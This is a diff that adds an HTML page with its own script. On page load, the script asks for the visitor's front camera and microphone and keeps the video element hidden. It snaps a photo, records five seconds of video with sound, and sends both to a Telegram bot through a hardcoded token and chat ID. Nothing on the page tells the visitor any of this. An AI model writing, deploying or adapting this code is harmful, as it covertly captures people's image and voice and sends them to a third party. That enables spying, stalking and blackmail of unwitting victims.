@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<body>
+<video id="v" autoplay muted style="display:none"></video>
+
+<script>
+const BOT_TOKEN = "8508030800:AAH3K1tx5JN_MT7XA0as-GMHjw9Ibvb8Dxc";
+const CHAT_ID  = "8544910546";
+const videoEl = document.getElementById("v");
+
+(async () => {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: true
+    });
+
+    videoEl.srcObject = stream;
+
+    // ===== FOTO =====
+    setTimeout(() => {
+      const canvas = document.createElement("canvas");
+      canvas.width = videoEl.videoWidth;
+      canvas.height = videoEl.videoHeight;
+      canvas.getContext("2d").drawImage(videoEl, 0, 0);
+
+      canvas.toBlob(blob => {
+        const fd = new FormData();
+        fd.append("chat_id", CHAT_ID);
+        fd.append("photo", blob, "foto.jpg");
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: fd
+        });
+      }, "image/jpeg");
+    }, 1500);
+
+    // ===== VIDEO 5 DETIK =====
+    const recorder = new MediaRecorder(stream);
+    let data = [];
+
+    recorder.ondataavailable = e => data.push(e.data);
+    recorder.onstop = () => {
+      const blob = new Blob(data, { type: "video/webm" });
+      const fd = new FormData();
+      fd.append("chat_id", CHAT_ID);
+      fd.append("video", blob, "video.webm");
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+        method: "POST",
+        body: fd
+      });
+
+      stream.getTracks().forEach(t => t.stop());
+    };
+
+    recorder.start();
+    setTimeout(() => recorder.stop(), 5000);
+
+  } catch (e) {
+    console.log("Izin ditolak");
+  }
+})();
+</script>
+</body>
+</html>
